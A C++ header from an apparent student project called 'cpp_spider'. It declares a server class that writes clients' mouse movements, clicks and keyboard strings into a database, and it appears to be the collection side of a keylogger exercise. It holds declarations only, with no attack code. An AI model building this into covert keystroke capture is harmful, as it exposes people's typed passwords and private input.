//
// SqlServer.hh for sqlServer in /home/debrab_t/rendu/TEK3/cpp_spider/bdd_connect
//
// Made by debrab_t
// Login   <debrab_t@epitech.net>
//
// Started on  Mon Nov  7 10:23:23 2016 debrab_t
// Last update Wed Nov  9 11:52:55 2016 debrab_t
//

#include "bdd_connect/SqlManager.hh"
#include "spider/packetUnserializer.hpp"

class SqlServer
{
public:
  SqlServer();
  ~SqlServer();
  bool	dbConnect(std::string const &);
  void	createServTab();
  void	addClient(spider::PacketUnserializer &);
  void	addMouseMouvement(spider::PacketUnserializer &);
  void	addMouseClick(spider::PacketUnserializer &);
  void	addKeyboardString(spider::PacketUnserializer &);
  void	disconnectClient(spider::PacketUnserializer &);
  bool	putIntoBdd(spider::PacketUnserializer &);
  void	feedPointMap();

private:
  SqlManager	sqlMan;
  int		clientId;
  typedef void	(SqlServer::*bddFunc)(spider::PacketUnserializer &);
  std::map<std::string, bddFunc> _pointMap;
};
